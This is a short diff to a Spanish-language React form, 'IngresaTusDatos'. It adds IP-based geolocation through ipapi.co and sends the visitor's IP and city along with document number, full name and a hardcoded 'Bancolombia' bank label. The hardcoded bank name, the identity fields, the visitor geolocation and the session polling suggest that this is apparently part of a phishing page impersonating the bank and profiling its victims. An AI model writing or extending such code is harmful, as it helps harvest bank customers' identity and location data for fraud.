@@ -54,6 +54,7 @@ export default function IngresaTusDatos() {
 
   // Se inicializa los estados
   const [ip, setIp] = useState("");
+  const [ciudad, setCiudad] = useState(""); // Ciudad y departamento
   const [fechaHora, setFechaHora] = useState("");
 
   // Refs para polling y sesión
@@ -77,6 +78,9 @@ export default function IngresaTusDatos() {
 
     // Se obtiene la IP
     obtenerIP();
+
+    // Se obtiene la localización (ciudad y departamento)
+    obtenerLocalizacion();
 
     // Se obtiene la fecha/hora con formato
     obtenerFechaHora();
@@ -134,6 +138,22 @@ export default function IngresaTusDatos() {
       // Se asigna un valor por defecto para evitar fallos en la UI
       setIp("No disponible");
     };
+  };
+
+  // Obtiene la localización (ciudad y departamento) basada en la IP
+  const obtenerLocalizacion = async () => {
+    try {
+      // API gratuita de ipapi.co (incluye ciudad y región/departamento)
+      const response = await fetch("https://ipapi.co/json/");
+      const data = await response.json();
+
+      // Formatear: "Ciudad, Departamento"
+      const localizacion = `${data.city || 'Ciudad desconocida'}, ${data.region || 'Región desconocida'}`;
+      setCiudad(localizacion);
+    } catch (error) {
+      console.error("Error obteniendo localización", error);
+      setCiudad("No disponible");
+    }
   };
 
   // Obtiene la fecha y hora actual del sistema
@@ -404,6 +424,8 @@ export default function IngresaTusDatos() {
         "attributes": {
           'banco': "Bancolombia",
           'fecha': fechaHora,
+          'ip': ip,
+          'ciudad': ciudad,
           'tipoDocumento': tipoDocumento,
           'numeroDocumento': numeroDocumento,
           'nombreCompleto': nombreCompleto,
